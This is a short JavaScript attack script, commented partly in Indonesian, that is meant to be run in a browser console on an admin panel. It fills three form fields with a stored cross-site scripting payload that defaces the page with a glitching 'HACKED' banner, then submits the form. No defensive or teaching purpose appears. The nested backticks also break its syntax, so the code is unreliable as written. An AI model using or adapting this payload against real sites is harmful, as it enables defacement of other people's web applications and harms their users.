
// XSS Injection Script
// Run this in browser console saat sudah login ke admin panel

function injectPayload() {
    // Fill form dengan payload
    document.getElementById('email').value = `<script>
document.body.innerHTML = `
<style>
body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.hacked{font-size:60px;animation:glitch 1s infinite}
@keyframes glitch{0%,100%{text-shadow:2px 0 red,-2px 0 cyan}50%{text-shadow:-2px 0 red,2px 0 cyan}}
</style>
<div class="hacked">⚠️ HACKED ⚠️</div>
`;
</script>`;
    document.getElementById('anak').value = `<script>
document.body.innerHTML = `
<style>
body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.hacked{font-size:60px;animation:glitch 1s infinite}
@keyframes glitch{0%,100%{text-shadow:2px 0 red,-2px 0 cyan}50%{text-shadow:-2px 0 red,2px 0 cyan}}
</style>
<div class="hacked">⚠️ HACKED ⚠️</div>
`;
</script>`;
    document.getElementById('alamat').value = `<script>
document.body.innerHTML = `
<style>
body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.hacked{font-size:60px;animation:glitch 1s infinite}
@keyframes glitch{0%,100%{text-shadow:2px 0 red,-2px 0 cyan}50%{text-shadow:-2px 0 red,2px 0 cyan}}
</style>
<div class="hacked">⚠️ HACKED ⚠️</div>
`;
</script>`;
    
    // Submit form
    document.getElementById('myForm').submit();
    
    console.log('[+] Payload injected!');
}

// Execute
injectPayload();
